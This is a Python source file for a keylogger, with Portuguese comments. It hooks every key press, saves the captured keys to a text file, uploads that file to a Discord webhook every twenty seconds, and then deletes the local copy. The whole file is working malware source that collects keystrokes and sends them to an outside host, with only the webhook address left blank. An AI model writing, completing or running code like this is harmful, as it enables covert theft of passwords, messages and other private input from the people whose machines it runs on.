import time
from discord_webhook import DiscordWebhook
import keyboard
import os

# URL da webhook do servidor do discord que vai ser enviada as logs
webhook_url = ''


logfile_path = 'logs.txt'
keylogs = []

def on_press(event):
    keylogs.append(event.name)

def format_logs(logs):
    formatted_logs = []
    for log in logs:
        formatted_logs.append(f'- {log}')
    return '\n'.join(formatted_logs)

def save_logs(logs):
    with open(logfile_path, 'w') as file:
        file.write(logs)

def send_logs():
    if len(keylogs) > 0:
        logs = keylogs.copy()
        formatted_logs = format_logs(logs)
        save_logs(formatted_logs)
        webhook = DiscordWebhook(url=webhook_url)
        webhook.add_file(file=open(logfile_path, 'rb'), filename='logs.txt')
        response = webhook.execute()
        if response.status_code != 204:
            print('Erro ao enviar os logs para o webhook do Discord')
        keylogs.clear()
        os.remove(logfile_path)

def start_logging():
    # Começa a monitorar as teclas pressionadas
    keyboard.on_press(on_press)

    while True:
        # Envia os logs de 20 em 20 segundos
        send_logs()
        time.sleep(20)

start_logging()

₢ Lucas Miranda 2023